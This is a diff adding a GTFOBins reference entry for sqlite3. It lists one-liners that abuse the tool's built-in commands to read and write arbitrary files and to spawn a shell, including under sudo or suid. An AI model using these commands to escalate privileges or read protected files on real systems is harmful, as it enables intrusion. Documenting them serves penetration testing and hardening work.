@@ -1,0 +1,32 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/sqlite3 -->
+---
+functions:
+  file-read:
+  - binary: false
+    code: |-
+      sqlite3 <<EOF
+      CREATE TABLE x(x TEXT);
+      .import /path/to/input-file x
+      SELECT * FROM x;
+      EOF
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - binary: false
+    code: |-
+      sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      sqlite3 /dev/null '.shell /bin/sh'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
